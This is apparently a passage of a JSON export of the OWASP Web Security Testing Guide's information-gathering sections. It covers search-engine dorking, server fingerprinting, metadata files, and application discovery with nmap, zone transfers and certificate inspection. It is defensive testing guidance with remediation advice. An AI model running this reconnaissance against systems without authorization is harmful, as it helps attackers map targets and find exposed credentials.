{
    "WSTG-INFO-01": {
        "summary": "<h3>Summary</h3><p>In order for search engines to work, computer programs (or robots ) regularly fetch data (referred to as crawling ) from billions of pages on the web. These programs find web content and functionality by following links from other pages, or by looking at sitemaps. If a site uses a special file called robots.txt to list pages that it does not want search engines to fetch, then the pages listed there will be ignored. This is a basic overview - Google offers a more in-depth explanation of how a search engine works .</p><p>Testers can use search engines to perform reconnaissance on sites and web applications. There are direct and indirect elements to search engine discovery and reconnaissance: direct methods relate to searching the indexes and the associated content from caches, while indirect methods relate to learning sensitive design and configuration information by searching forums, newsgroups, and tendering sites.</p><p>Once a search engine robot has completed crawling, it commences indexing the web content based on tags and associated attributes, such as <TITLE> , in order to return relevant search results. If the robots.txt file is not updated during the lifetime of the site, and in-line HTML meta tags that instruct robots not to index content have not been used, then it is possible for indexes to contain web content not intended to be included by the owners. Site owners may use the previously mentioned robots.txt , HTML meta tags, authentication, and tools provided by search engines to remove such content.</p><h3>Test Objectives</h3><ul><li>Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization’s site) or indirectly (via third-party services).</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Use a search engine to search for potentially sensitive information. This may include:</p><ul><li>network diagrams and configurations;</li><li>archived posts and emails by administrators or other key staff;</li><li>logon procedures and username formats;</li><li>usernames, passwords, and private keys;</li><li>third-party, or cloud service configuration files;</li><li>revealing error message content; and</li><li>non-public applications (development, test, User Acceptance Testing (UAT), and staging versions of sites).</li></ul><p>Do not limit testing to just one search engine provider, as different search engines may generate different results. Search engine results can vary in a few ways, depending on when the engine last crawled content, and the algorithm the engine uses to determine relevant pages. Consider using the following (alphabetically listed) search engines:</p><ul><li>Baidu, China’smost popularsearch engine.</li><li>Bing, a search engine owned and operated by Microsoft, and the secondmost popularworldwide. Supportsadvanced search keywords.</li><li>binsearch.info, a search engine for binary Usenet newsgroups.</li><li>Common Crawl, “an open repository of web crawl data that can be accessed and analyzed by anyone.”</li><li>DuckDuckGo, a privacy-focused search engine that compiles results from many differentsources. Supportssearch syntax.</li><li>Google, which offers the world’smost popularsearch engine, and uses a ranking system to attempt to return the most relevant results. Supportssearch operators.</li><li>Internet Archive Wayback Machine, “building a digital library of internet sites and other cultural artifacts in digital form.”</li><li>Shodan, a service for searching internet-connected devices and services. Usage options include a limited free plan as well as paid subscription plans.</li></ul><p>A search operator is a special keyword or syntax that extends the capabilities of regular search queries, and can help obtain more specific results. They generally take the form of operator:query . Here are some commonly supported search operators:</p><ul><li>site:will limit the search to the provided domain.</li><li>inurl:will only return results that include the keyword in the URL.</li><li>intitle:will only return results that have the keyword in the page title.</li><li>intext:orinbody:will only search for the keyword in the body of pages.</li><li>filetype:will match only a specific file type, i.e..png, or.php.</li></ul><p>For example, to find the web content of owasp.org as indexed by a typical search engine, the syntax required is:</p><pre><code>site:owasp.org</code></pre><p>Figure 4.1.1-1: Google Site Operation Search Result Example</p><br><p>To search for content that has previously been indexed, use the cache: operator. This is helpful for viewing content that may have changed since the time it was indexed, or that may no longer be available. Not all search engines provide cached content to search; the most useful source at time of writing is Google.</p><p>To view owasp.org as it is cached, the syntax is:</p><pre><code>cache:owasp.org</code></pre><p>Figure 4.1.1-2: Google Cache Operation Search Result Example</p><br><p>Searching with operators can be a very effective discovery technique when combined with the creativity of the tester. Operators can be chained to effectively discover specific kinds of sensitive files and information. This technique, called Google hacking or Dorking, is also possible using other search engines, as long as the search operators are supported.</p><p>A database of dorks, like the Google Hacking Database , is a useful resource that can help uncover specific information. Some categories of dorks available on this database include:</p><ul><li>Footholds</li><li>Files containing usernames</li><li>Sensitive Directories</li><li>Web Server Detection</li><li>Vulnerable Files</li><li>Vulnerable Servers</li><li>Error Messages</li><li>Files containing juicy info</li><li>Files containing passwords</li><li>Sensitive Online Shopping Info</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>Carefully consider the sensitivity of design and configuration information before it is posted online.</p><p>Periodically review the sensitivity of existing design and configuration information that is posted online.</p>",
        "test_objectives": ""
    },
    "WSTG-INFO-02": {
        "summary": "<h3>Summary</h3><p>Web server fingerprinting is the task of identifying the type and version of web server that a target is running on. While web server fingerprinting is often encapsulated in automated testing tools, it is important for researchers to understand the fundamentals of how these tools attempt to identify software, and why this is useful.</p><p>Accurately discovering the type of web server that an application runs on can enable security testers to determine if the application is vulnerable to attack. In particular, servers running older versions of software without up-to-date security patches can be susceptible to known version-specific exploits.</p><h3>Test Objectives</h3><ul><li>Determine the version and type of a running web server to enable further discovery of any known vulnerabilities.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Techniques used for web server fingerprinting include banner grabbing , eliciting responses to malformed requests, and using automated tools to perform more robust scans that use a combination of tactics. The fundamental premise on which all these techniques operate is the same. They all strive to elicit some response from the web server which can then be compared to a database of known responses and behaviors, and thus matched to a known server type.</p><p>A banner grab is performed by sending an HTTP request to the web server and examining its response header . This can be accomplished using a variety of tools, including telnet for HTTP requests, or openssl for requests over TLS/SSL.</p><p>For example, here is the response to a request sent to an Apache server.</p><pre><code>HTTP / 1.1 200 OK Date : Thu, 05 Sep 2019 17:42:39 GMT Server : Apache/2.4.41 (Unix) Last-Modified : Thu, 05 Sep 2019 17:40:42 GMT ETag : \"75-591d1d21b6167\" Accept-Ranges : bytes Content-Length : 117 Connection : close Content-Type : text/html ...</code></pre><p>Here is another response, this time sent by nginx.</p><pre><code>HTTP / 1.1 200 OK Server : nginx/1.17.3 Date : Thu, 05 Sep 2019 17:50:24 GMT Content-Type : text/html Content-Length : 117 Last-Modified : Thu, 05 Sep 2019 17:40:42 GMT Connection : close ETag : \"5d71489a-75\" Accept-Ranges : bytes ...</code></pre><p>Here’s what a response sent by lighttpd looks like.</p><pre><code>HTTP/1.0 200 OK\nContent-Type: text/html\nAccept-Ranges: bytes\nETag: \"4192788355\" Last-Modified: Thu, 05 Sep 2019 17:40:42 GMT\nContent-Length: 117\nConnection: close\nDate: Thu, 05 Sep 2019 17:57:57 GMT\nServer: lighttpd/1.4.54</code></pre><p>In these examples, the server type and version is clearly exposed. However, security-conscious applications may obfuscate their server information by modifying the header. For example, here is an excerpt from the response to a request for a site with a modified header:</p><pre><code>HTTP/1.1 200 OK\nServer: Website.com\nDate: Thu, 05 Sep 2019 17:57:06 GMT\nContent-Type: text/html ; charset = utf-8\nStatus: 200 OK\n...</code></pre><p>In cases where the server information is obscured, testers may guess the type of server based on the ordering of the header fields. Note that in the Apache example above, the fields follow this order:</p><ul><li>Date</li><li>Server</li><li>Last-Modified</li><li>ETag</li><li>Accept-Ranges</li><li>Content-Length</li><li>Connection</li><li>Content-Type</li></ul><p>However, in both the nginx and obscured server examples, the fields in common follow this order:</p><ul><li>Server</li><li>Date</li><li>Content-Type</li></ul><p>Testers can use this information to guess that the obscured server is nginx. However, considering that a number of different web servers may share the same field ordering and fields can be modified or removed, this method is not definite.</p><p>Web servers may be identified by examining their error responses, and in the cases where they have not been customized, their default error pages. One way to compel a server to present these is by sending intentionally incorrect or malformed requests.</p><p>For example, here is the response to a request for the non-existent method SANTA CLAUS from an Apache server.</p><pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.1 400 Bad Request\nDate: Fri, 06 Sep 2019 19:21:01 GMT\nServer: Apache/2.4.41 ( Unix ) Content-Length: 226\nConnection: close\nContent-Type: text/html ; charset = iso-8859-1\n\n< ! DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\" > <html>< head > <title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n</body></html></code></pre><p>Here is the response to the same request from nginx.</p><pre><code>GET / SANTA CLAUS/1.1\n\n\n<html>\n< head > <title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.17.3</center>\n</body>\n</html></code></pre><p>Here is the response to the same request from lighttpd.</p><pre><code>GET / SANTA CLAUS/1.1\n\n\nHTTP/1.0 400 Bad Request\nContent-Type: text/html\nContent-Length: 345\nConnection: close\nDate: Sun, 08 Sep 2019 21:56:17 GMT\nServer: lighttpd/1.4.54\n\n<?xml version = \"1.0\" encoding = \"iso-8859-1\" ?>\n< ! DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\" > <html xmlns = \"https://www.w3.org/1999/xhtml/\" xml:lang = \"en\" lang = \"en\" > < head > <title>400 Bad Request</title>\n </head>\n <body>\n  <h1>400 Bad Request</h1>\n </body>\n</html></code></pre><p>As default error pages offer many differentiating factors between types of web servers, their examination can be an effective method for fingerprinting even when server header fields are obscured.</p><p>As stated earlier, web server fingerprinting is often included as a functionality of automated scanning tools. These tools are able to make requests similar to those demonstrated above, as well as send other more server-specific probes. Automated tools can compare responses from web servers much faster than manual testing, and utilize large databases of known responses to attempt server identification. For these reasons, automated tools are more likely to produce accurate results.</p><p>Here are some commonly-used scan tools that include web server fingerprinting functionality.</p><ul><li>Netcraft, an online tool that scans sites for information, including web server details.</li><li>Nikto, an Open Source command-line scanning tool.</li><li>Nmap, an Open Source command-line tool that also has a GUI,Zenmap.</li></ul>",
        "tools": "",
        "remediation": "<h3>Remediation</h3><p>While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific server vulnerabilities that can be used to exploit unpatched servers. For this reason it is recommended that some precautions be taken. These actions include:</p><ul><li>Obscuring web server information in headers, such as with Apache’smod_headers module.</li><li>Using a hardenedreverse proxy serverto create an additional layer of security between the web server and the internet.</li><li>Ensuring that web servers are kept up-to-date with the latest software and security patches.</li></ul>",
        "test_objectives": ""
    },
    "WSTG-INFO-03": {
        "summary": "<h3>Summary</h3><p>This section describes how to test various metadata files for information leakage of the web application’s path(s), or functionality. Furthermore, the list of directories that are to be avoided by Spiders, Robots, or Crawlers can also be created as a dependency for Map execution paths through application . Other information may also be collected to identify attack surface, technology details, or for use in social engineering engagement.</p><h3>Test Objectives</h3><ul><li>Identify hidden or obfuscated paths and functionality through the analysis of metadata files.</li><li>Extract and map other information that could lead to a better understanding of the systems at hand.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Any of the actions performed below with wget could also be done with curl . Many Dynamic Application Security Testing (DAST) tools such as ZAP and Burp Suite include checks or parsing for these resources as part of their spider/crawler functionality. They can also be identified using various Google Dorks or leveraging advanced search features such as inurl: .</p><p>Web Spiders, Robots, or Crawlers retrieve a web page and then recursively traverse hyperlinks to retrieve further web content. Their accepted behavior is specified by the Robots Exclusion Protocol of the robots.txt file in the web root directory.</p><p>As an example, the beginning of the robots.txt file from Google sampled on 2020 May 5 is quoted below:</p><pre><code>User-agent: *\nDisallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\nDisallow: /sdch\n...</code></pre><p>The User-Agent directive refers to the specific web spider/robot/crawler. For example, the User-Agent: Googlebot refers to the spider from Google while User-Agent: bingbot refers to a crawler from Microsoft. User-Agent: * in the example above applies to all web spiders/robots/crawlers .</p><p>The Disallow directive specifies which resources are prohibited by spiders/robots/crawlers. In the example above, the following are prohibited:</p><pre><code>...\nDisallow: /search\n...\nDisallow: /sdch\n...</code></pre><p>Web spiders/robots/crawlers can intentionally ignore the Disallow directives specified in a robots.txt file. Hence, robots.txt should not be considered as a mechanism to enforce restrictions on how web content is accessed, stored, or republished by third parties.</p><p>The robots.txt file is retrieved from the web root directory of the web server. For example, to retrieve the robots.txt from www.google.com using wget or curl :</p><pre><code>$ curl -O -Ss https://www.google.com/robots.txt && head -n5 robots.txt\nUser-agent: * Disallow: /search\nAllow: /search/about\nAllow: /search/static\nAllow: /search/howsearchworks\n...</code></pre><p>Site owners can use the Google “Analyze robots.txt” function to analyze the site as part of its Google Webmaster Tools . This tool can assist with testing and the procedure is as follows:</p><p><META> tags are located within the HEAD section of each HTML document and should be consistent across a site in the event that the robot/spider/crawler start point does not begin from a document link other than webroot i.e. a deep link . The Robots directive can also be specified using a specific META tag .</p><p>If there is no <META NAME=\"ROBOTS\" ... > entry, then the “Robots Exclusion Protocol” defaults to INDEX,FOLLOW respectively. Therefore, the other two valid entries defined by the “Robots Exclusion Protocol” are prefixed with NO... i.e. NOINDEX and NOFOLLOW .</p><p>Based on the Disallow directive(s) listed within the robots.txt file in webroot, a regular expression search for <META NAME=\"ROBOTS\" is undertaken within each web page. The result is then compared to the robots.txt file in the webroot.</p><p>Organizations often embed informational META tags in web content to support various technologies such as screen readers, social networking previews, search engine indexing, etc. Such meta-information can be of value to testers in identifying technologies used, and additional paths/functionality to explore and test. The following meta information was retrieved from www.whitehouse.gov via View Page Source on 2020 May 05:</p><pre><code>... <meta property= \"og:locale\" content= \"en_US\" /> <meta property= \"og:type\" content= \"website\" /> <meta property= \"og:title\" content= \"The White House\" /> <meta property= \"og:description\" content= \"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" /> <meta property= \"og:url\" content= \"https://www.whitehouse.gov/\" /> <meta property= \"og:site_name\" content= \"The White House\" /> <meta property= \"fb:app_id\" content= \"1790466490985150\" /> <meta property= \"og:image\" content= \"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /> <meta property= \"og:image:secure_url\" content= \"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /> <meta name= \"twitter:card\" content= \"summary_large_image\" /> <meta name= \"twitter:description\" content= \"We, the citizens of America, are now joined in a great national effort to rebuild our country and to restore its promise for all. – President Donald Trump.\" /> <meta name= \"twitter:title\" content= \"The White House\" /> <meta name= \"twitter:site\" content= \"@whitehouse\" /> <meta name= \"twitter:image\" content= \"https://www.whitehouse.gov/wp-content/uploads/2017/12/wh.gov-share-img_03-1024x538.png\" /> <meta name= \"twitter:creator\" content= \"@whitehouse\" /> ... <meta name= \"apple-mobile-web-app-title\" content= \"The White House\" > <meta name= \"application-name\" content= \"The White House\" > <meta name= \"msapplication-TileColor\" content= \"#0c2644\" > <meta name= \"theme-color\" content= \"#f5f5f5\" > ...</code></pre><p>A sitemap is a file where a developer or organization can provide information about the pages, videos, and other files offered by the site or application, and the relationship between them. Search engines can use this file to navigate your site more efficiently. Likewise, testers can utilize ‘sitemap.xml’ files to gain deeper insights into the site or application under investigation.</p><p>The following excerpt is from Google’s primary sitemap retrieved 2020 May 05.</p><pre><code>$ wget --no-verbose https://www.google.com/sitemap.xml && head -n8 sitemap.xml\n2020-05-05 12:23:30 URL:https://www.google.com/sitemap.xml [ 2049] -> \"sitemap.xml\" [ 1]\n\n<?xml version = \"1.0\" encoding = \"UTF-8\" ?>\n<sitemapindex xmlns = \"https://www.google.com/schemas/sitemap/0.84\" > <sitemap>\n    <loc>https://www.google.com/gmail/sitemap.xml</loc>\n  </sitemap>\n  <sitemap>\n    <loc>https://www.google.com/forms/sitemaps.xml</loc>\n  </sitemap>\n...</code></pre><p>Exploring from there a tester may wish to retrieve the gmail sitemap https://www.google.com/gmail/sitemap.xml :</p><pre><code><?xml version=\"1.0\" encoding=\"UTF-8\"?> <urlset xmlns= \"https://www.sitemaps.org/schemas/sitemap/0.9\" xmlns:xhtml= \"https://www.w3.org/1999/xhtml\" > <url> <loc> https://www.google.com/intl/am/gmail/about/ </loc> <xhtml:link href= \"https://www.google.com/gmail/about/\" hreflang= \"x-default\" rel= \"alternate\" /> <xhtml:link href= \"https://www.google.com/intl/el/gmail/about/\" hreflang= \"el\" rel= \"alternate\" /> <xhtml:link href= \"https://www.google.com/intl/it/gmail/about/\" hreflang= \"it\" rel= \"alternate\" /> <xhtml:link href= \"https://www.google.com/intl/ar/gmail/about/\" hreflang= \"ar\" rel= \"alternate\" /> ...</code></pre><p>security.txt was ratified by the IETF as RFC 9116 - A File Format to Aid in Security Vulnerability Disclosure which allows sites to define security policies and contact details. There are multiple reasons why this might be of interest in testing scenarios, which include, but are not limited to:</p><ul><li>Identifying further paths or resources to include in discovery/analysis.</li><li>Open Source intelligence gathering.</li><li>Finding information on Bug Bounties, etc.</li><li>Social Engineering.</li></ul><p>The file may be present either in the root of the webserver or in the .well-known/ directory, for example:</p><ul><li>https://example.com/security.txt</li><li>https://example.com/.well-known/security.txt</li></ul><p>Here is a real world example retrieved from LinkedIn 2020 May 05:</p><pre><code>$ wget --no-verbose https://www.linkedin.com/.well-known/security.txt && cat security.txt\n2020-05-07 12:56:51 URL:https://www.linkedin.com/.well-known/security.txt [ 333/333] -> \"security.txt\" [ 1] # Conforms to IETF `draft-foudil-securitytxt-07` Contact: mailto: [email protected] Contact: https://www.linkedin.com/help/linkedin/answer/62924\nEncryption: https://www.linkedin.com/help/linkedin/answer/79676\nCanonical: https://www.linkedin.com/.well-known/security.txt\nPolicy: https://www.linkedin.com/help/linkedin/answer/62924</code></pre><p>OpenPGP Public Keys contain some metadata that can provide information about the key itself. Here are some common metadata elements that can be extracted from an OpenPGP Public Key:</p><ul><li>Key ID: The Key ID is a short identifier derived from the public key material. It helps identify the key and is often displayed as an eight-character hexadecimal value.</li><li>Key Fingerprint: The Key Fingerprint is a longer and more unique identifier derived from the key material. It is often displayed as a 40-character hexadecimal value. Key fingerprints are commonly used to verify the integrity and authenticity of a public key.</li><li>Key Algorithm: The Key Algorithm represents the cryptographic algorithm used by the public key. OpenPGP supports various algorithms such as RSA, DSA, and ECC (Elliptic Curve Cryptography).</li><li>Key Size: The Key Size refers to the length or size of the cryptographic key in bits. It indicates the strength of the key and determines the level of security provided by the key.</li><li>Key Creation Date: The Key Creation Date indicates when the key was generated or created.</li><li>Key Expiration Date: OpenPGP Public Keys can have an expiration date set, after which they are considered invalid. The Key Expiration Date specifies when the key is no longer valid.</li><li>User IDs: Public keys can have one or more associated User IDs that identify the owner or entity associated with the key. User IDs typically include information such as the name, email address, and optional comments of the key owner.</li></ul><p>humans.txt is an initiative for knowing the people behind a site. It takes the form of a text file that contains information about the different people who have contributed to building the site. This file often (but not always) contains information related to career or job sites/paths.</p><p>The following example was retrieved from Google 2020 May 05:</p><pre><code>$ wget --no-verbose https://www.google.com/humans.txt && cat humans.txt\n2020-05-07 12:57:52 URL:https://www.google.com/humans.txt [ 286/286] -> \"humans.txt\" [ 1]\nGoogle is built by a large team of engineers, designers, researchers, robots, and others in many different sites across the globe. It is updated continuously, and built with more tools and technologies than we can shake a stick at. If you 'd like to help us out, see careers.google.com.</code></pre><p>There are other RFCs and internet drafts which suggest standardized uses of files within the .well-known/ directory. Lists of these can be found here or here .</p><p>It would be fairly simple for a tester to review the RFC/drafts and create a list to be supplied to a crawler or fuzzer, in order to verify the existence or content of such files.</p>",
        "tools": "<h3>Tools</h3><ul><li>Browser (View Source or Dev Tools functionality)</li><li>curl</li><li>wget</li><li>Burp Suite</li><li>ZAP</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
    "WSTG-INFO-04": {
        "summary": "<h3>Summary</h3><p>A paramount step in testing for web application vulnerabilities is to find out which particular applications are hosted on a web server. Many applications have known vulnerabilities and known attack strategies that can be exploited in order to gain remote control or to exploit data. In addition, many applications are often misconfigured or not updated, due to the perception that they are only used “internally” and therefore no threat exists.\nWith the proliferation of virtual web servers, the traditional 1:1-type relationship between an IP address and a web server is losing much of its original significance. It is not uncommon to have multiple sites or applications whose symbolic names resolve to the same IP address. This scenario is not limited to hosting environments, but also applies to ordinary corporate environments as well.</p><p>Security professionals are sometimes given a set of IP addresses as a target to test. It is arguable that this scenario is more akin to a penetration test-type engagement, but in any case it is expected that such an assignment would test all web applications accessible through this target. The problem is that the given IP address hosts an HTTP service on port 80, but if a tester should access it by specifying the IP address (which is all they know) it reports “No web server configured at this address” or a similar message. But that system could “hide” a number of web applications, associated to unrelated symbolic (DNS) names. Obviously, the extent of the analysis is deeply affected depending on whether the tester tests all the applications or only tests the applications that they are aware of.</p><p>Sometimes, the target specification is richer. The tester may be given a list of IP addresses and their corresponding symbolic names. Nevertheless, this list might convey partial information, i.e., it could omit some symbolic names and the client may not even be aware of that (this is more likely to happen in large organizations).</p><p>Other issues affecting the scope of the assessment are represented by web applications published at non-obvious URLs (e.g., https://www.example.com/some-strange-URL ), which are not referenced elsewhere. This may happen either by error (due to misconfigurations), or intentionally (for example, unadvertised administrative interfaces).</p><p>To address these issues, it is necessary to perform web application discovery.</p><h3>Test Objectives</h3><ul><li>Enumerate the applications within the scope that exist on a web server.</li></ul>",
        "how-to": "<h3>How to Test</h3><p>Web application discovery is a process that aims to identify web applications on a given infrastructure. The latter is usually specified as a set of IP addresses (maybe a net block), but may consist of a set of DNS symbolic names or a mix of the two. This information is handed out prior to the execution of an assessment, be it a classic-style penetration test or an application-focused assessment. In both cases, unless the rules of engagement specify otherwise (e.g., test only the application located at the URL https://www.example.com/ ), the assessment should strive to be the most comprehensive in scope, i.e. it should identify all the applications accessible through the given target. The following examples examine a few techniques that can be employed to achieve this goal.</p><p>Some of the following techniques apply to Internet-facing web servers, namely DNS and reverse-IP web-based search services and the use of search engines. Examples make use of private IP addresses (such as 192.168.1.100 ), which, unless indicated otherwise, represent generic IP addresses and are used only for anonymity purposes.</p><p>There are three factors influencing how many applications are related to a given DNS name (or an IP address):</p><p>Different Base URL</p><p>The obvious entry point for a web application is www.example.com , i.e., with this shorthand notation we think of the web application originating at https://www.example.com/ (the same applies for HTTPS). However, even though this is the most common situation, there is nothing forcing the application to start at / .</p><p>For example, the same symbolic name may be associated to three web applications such as: https://www.example.com/app1 https://www.example.com/app2 https://www.example.com/app3</p><p>In this case, the URL https://www.example.com/ would not be associated with a meaningful page. The three applications would remain hidden unless the tester explicitly knows how to access them, i.e., the tester knows app1 , app2 or app3 . There is usually no need to publish web applications in this way, unless the owner doesn’t want them to be accessible in a standard way, and is prepared to inform the users about their exact location. This doesn’t mean that these applications are secret, just that their existence and location is not explicitly advertised.</p><p>Non-standard Ports</p><p>While web applications usually live on port 80 (HTTP) and 443 (HTTPS), there is nothing fixed or mandatory about these port numbers. In fact, web applications may be associated with arbitrary TCP ports, and can be referenced by specifying the port number as follows: http[s]://www.example.com:port/ . For example, https://www.example.com:20000/ .</p><p>Virtual Hosts</p><p>DNS allows a single IP address to be associated with one or more symbolic names. For example, the IP address 192.168.1.100 might be associated to DNS names www.example.com , helpdesk.example.com , webmail.example.com . It is not necessary that all the names belong to the same DNS domain. This 1-to-N relationship may be reflected to serve different content by using so called virtual hosts. The information specifying the virtual host we are referring to is embedded in the HTTP 1.1 Host header .</p><p>One would not suspect the existence of other web applications in addition to the obvious www.example.com , unless they know of helpdesk.example.com and webmail.example.com .</p><p>There is no way to fully ascertain the existence of non-standard-named web applications. Being non-standard, there are no fixed criteria governing the naming convention, however there are a number of techniques that the tester can use to gain some additional insight.</p><p>First, if the web server is mis-configured and allows directory browsing, it may be possible to spot these applications. Vulnerability scanners may help in this respect.</p><p>Second, these applications may be referenced by other web pages and there is a chance that they have been spidered and indexed by web search engines. If testers suspect the existence of such hidden applications on www.example.com they could search using the site operator and examining the result of a query for site: www.example.com . Among the returned URLs there could be one pointing to such a non-obvious application.</p><p>Another option is to probe for URLs which might be likely candidates for non-published applications. For example, a web mail frontend might be accessible from URLs such as https://www.example.com/webmail , https://webmail.example.com/ , or https://mail.example.com/ . The same holds for administrative interfaces, which may be published at hidden URLs (for example, a Tomcat administrative interface), and yet not referenced anywhere. So doing a bit of dictionary-style searching (or “intelligent guessing”) could yield some results. Vulnerability scanners may help in this respect.</p><p>It is easy to check for the existence of web applications on non-standard ports. A port scanner such as Nmap is capable of performing service recognition by means of the -sV option, and will identify http[s] services on arbitrary ports. What is required is a full scan of the whole 64k TCP port address space.</p><p>For example, the following command will look up, with a TCP connect scan, all the open ports on IP 192.168.1.100 and will try to determine what services are bound to them (only essential switches are shown – Nmap features a broad set of options, whose discussion is out of scope):</p><p>nmap –Pn –sT –sV –p0-65535 192.168.1.100</p><p>It is sufficient to examine the output and look for HTTP or the indication of TLS-wrapped services (which should be probed to confirm that they are HTTPS). For example, the output of the previous command could look like:</p><pre><code>Interesting ports on 192.168.1.100: ( The 65527 ports scanned but not shown below are in state: closed ) PORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 ( protocol 1.99 ) 80/tcp    open  http        Apache httpd 2.0.40 (( Red Hat Linux )) 443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1</code></pre><p>From this example, one can see that:</p><ul><li>There is an Apache HTTP server running on port 80.</li><li>It looks like there is an HTTPS server on port 443 (but this needs to be confirmed, for example, by visitinghttps://192.168.1.100with a browser).</li><li>On port 901 there is a Samba SWAT web interface.</li><li>The service on port 1241 is not HTTPS, but is the TLS-wrapped Nessus daemon.</li><li>Port 3690 features an unspecified service (Nmap gives back itsfingerprint- here omitted for clarity - together with instructions to submit it for incorporation in the Nmap fingerprint database, provided you know which service it represents).</li><li>Another unspecified service on port 8000; this might possibly be HTTP, since it is not uncommon to find HTTP servers on this port. Let’s examine this issue:</li></ul><pre><code>$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is '^]' . GET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n<html>\n...</code></pre><p>This confirms that in fact it is an HTTP server. Alternatively, testers could have visited the URL with a web browser; or used the GET or HEAD Perl commands, which mimic HTTP interactions such as the one given above (however HEAD requests may not be honored by all servers).</p><ul><li>Apache Tomcat running on port 8080.</li></ul><p>The same task may be performed by vulnerability scanners, but first check that the scanner of choice is able to identify HTTP[S] services running on non-standard ports. For example, Nessus is capable of identifying them on arbitrary ports (provided it is instructed to scan all the ports), and will provide, with respect to Nmap, a number of tests on known web server vulnerabilities, as well as on the TLS/SSL configuration of HTTPS services. As hinted before, Nessus is also able to spot popular applications or web interfaces which could otherwise go unnoticed (for example, a Tomcat administrative interface).</p><p>There are a number of techniques which may be used to identify DNS names associated to a given IP address x.y.z.t .</p><p>This technique has limited use nowadays, given the fact that zone transfers are largely not honored by DNS servers. However, it could still be worth attempting. First of all, testers must determine the name servers serving x.y.z.t . If a symbolic name is known for x.y.z.t (let it be www.example.com ), its name servers can be determined by means of tools such as nslookup , host , or dig , by requesting DNS NS records.</p><p>If no symbolic names are known for x.y.z.t , but the target definition contains at least a symbolic name, testers may try to apply the same process and query the name server of that name (hoping that x.y.z.t will be served as well by that name server). For example, if the target consists of the IP address x.y.z.t and the name mail.example.com , determine the name servers for domain example.com .</p><p>The following example shows how to identify the name servers for www.owasp.org by using the host command:</p><pre><code>$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.</code></pre><p>A zone transfer can now be requested to the name servers for the domain example.com . If the tester is fortunate, they may receive a list of the DNS entries for this domain in response. This will include the obvious www.example.com and the not-so-obvious helpdesk.example.com and webmail.example.com (and possibly others). Check all the names returned by the zone transfer and consider all of those which are related to the target being evaluated.</p><p>Trying to request a zone transfer for owasp.org from one of its name servers:</p><pre><code>$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5 ( REFUSED ) ; Transfer failed.</code></pre><p>This process is similar to the previous one, but relies on inverse (PTR) DNS records. Rather than requesting a zone transfer, try setting the record type to PTR and issue a query on the given IP address. If the testers are fortunate, they may receive a DNS name entry in response. This technique relies on the existence of IP-to-symbolic name maps, which is not guaranteed.</p><p>This kind of search is akin to DNS zone transfer, but relies on web-based services that enable name-based searches on DNS. One such service is the Netcraft Search DNS service. The tester may query for a list of names belonging to your domain of choice, such as example.com . They will then check whether the names they obtained are pertinent to the target they are examining.</p><p>Reverse-IP services are similar to DNS inverse queries, with the difference that the testers query a web-based application instead of a name server. There are a number of such services available. Since they tend to return partial (and often different) results, it is better to use multiple services to obtain a more comprehensive analysis.</p><ul><li>MxToolbox Reverse IP</li><li>DNSstuff(multiple services available)</li><li>Net Square(multiple queries on domains and IP addresses, requires installation)</li></ul><p>Following information gathering from the previous techniques, testers can rely on search engines to possibly refine and increment their analysis. This may yield evidence of additional symbolic names belonging to the target, or applications accessible via non-obvious URLs.</p><p>For instance, considering the previous example regarding www.owasp.org , the tester could query Google and other search engines looking for information (hence, DNS names) related to the newly discovered domains of webgoat.org , webscarab.com , and webscarab.net .</p><p>Googling techniques are explained in Testing: Spiders, Robots, and Crawlers .</p><p>If the server accepts connections over HTTPS, then the Common Name (CN) and Subject Alternate Name (SAN) on the certificate may contain one or more hostnames. However, if the webserver does not have a trusted certificate, or wildcards are in use, this may not return any valid information.</p><p>The CN and SAN can be obtained by manually inspecting the certificate, or through other tools such as OpenSSL:</p><pre><code>openssl s_client -connect 93.184.216.34:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'DNS:|Subject:' Subject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net</code></pre>",
        "tools": "<h3>Tools</h3><ul><li>DNS lookup tools such asnslookup,digand similar.</li><li>Search engines (Google, Bing, and other major search engines).</li><li>Specialized DNS-related web-based search service: see text.</li><li>Nmap</li><li>Nessus Vulnerability Scanner</li><li>Nikto</li></ul>",
        "remediation": "",
        "test_objectives": ""
    },
